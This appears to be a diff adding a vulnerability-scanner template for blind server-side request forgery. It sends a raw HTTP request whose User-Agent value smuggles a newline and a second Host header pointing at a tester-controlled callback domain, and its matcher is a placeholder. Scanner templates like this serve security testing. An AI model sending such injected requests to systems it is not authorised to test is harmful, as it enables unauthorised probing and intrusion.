@@ -1,0 +1,23 @@
+id: 0x115
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET / HTTP/1.1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nHost: {{Host}}.{{Port}}.BSSRF-115.{{MY-DOMAIN}}
+      Cache-Control: no-transform
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Host: {{Hostname}}
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
